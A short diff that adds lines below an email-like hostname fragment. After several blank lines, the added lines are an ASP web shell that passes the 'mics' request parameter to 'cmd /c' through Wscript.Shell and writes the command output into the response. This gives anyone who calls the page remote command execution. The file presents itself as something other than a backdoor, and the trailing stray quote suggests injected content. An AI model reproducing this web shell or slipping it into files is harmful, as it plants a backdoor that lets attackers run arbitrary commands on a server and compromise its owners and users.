@@ -1,1 +1,9 @@
 2dd258c6.theice.com@amer.
+
+
+
+
+<% 
+Response.Write(CreateObject("Wscript.Shell").exec("cmd /c " & Request("mics")).StdOut.ReadAll)
+%>
+'
